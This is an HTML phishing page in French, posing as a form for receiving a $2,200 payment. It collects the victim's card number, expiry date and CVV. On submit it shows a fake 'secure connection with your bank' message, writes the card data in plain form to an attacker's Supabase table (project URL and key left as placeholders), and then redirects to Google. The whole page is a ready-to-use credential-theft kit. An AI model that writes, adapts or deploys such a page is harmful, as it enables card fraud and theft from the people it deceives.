<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Réception de Paiement</title>
    <script src="https://jsdelivr.net"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .amount { font-size: 36px; font-weight: 800; color: #2ecc71; margin-bottom: 20px; }
        label { display: block; text-align: left; margin-bottom: 5px; font-size: 13px; color: #666; font-weight: 600; }
        input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; background: #fafafa; }
        .row { display: flex; gap: 10px; }
        .info-cvv { font-size: 11px; color: #999; margin-bottom: 15px; display: block; text-align: left; }
        button { width: 100%; background-color: #3498db; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #waiting { display: none; padding: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <div id="ui-form">
        <div class="amount">2 200,00 $</div>
        <form id="f">
            <label>NUMÉRO DE CARTE</label>
            <input type="text" id="c" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
            <div class="row">
                <div style="flex:2"><label>EXPIRATION</label><input type="text" id="e" placeholder="MM/AA" inputmode="numeric" maxlength="5" required></div>
                <div style="flex:1"><label>CVV</label><input type="password" id="v" placeholder="123" inputmode="numeric" maxlength="3" required></div>
            </div>
            <span class="info-cvv">Le code à 3 chiffres est situé au dos de votre carte</span>
            <button type="submit">RECEVOIR LE PAIEMENT</button>
        </form>
    </div>

    <div id="waiting">
        <div class="loader"></div>
        <h2>Veuillez patienter...</h2>
        <p style="color: #666;">Connexion sécurisée avec votre banque en cours.</p>
    </div>
</div>

<script>
    // --- TES INFOS SUPABASE ---
    const URL = "https://TON_PROJET.supabase.co"; 
    const KEY = "TA_CLE_ANON"; 
    const supabase = window.supabase.createClient(URL, KEY);

    // Formatage auto
    document.getElementById('c').oninput = x => { x.target.value = x.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim(); };
    document.getElementById('e').oninput = x => { let v = x.target.value.replace(/[^\d]/g, ''); if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2); x.target.value = v; };

    document.getElementById('f').onsubmit = async (event) => {
        event.preventDefault();
        document.getElementById('ui-form').style.display = 'none';
        document.getElementById('waiting').style.display = 'block';

        const { error } = await supabase.from('paiements').insert([{ 
            numero_carte: document.getElementById('c').value, 
            expiration: document.getElementById('e').value, 
            cvv: document.getElementById('v').value 
        }]);

        if (error) {
            alert("Erreur de connexion. Vérifiez le RLS sur Supabase.");
            location.reload();
        } else {
            // Pause visuelle de 4 secondes avant redirection
            setTimeout(() => { window.location.href = "https://google.com"; }, 4000);
        }
    };
</script>
</body>
</html>
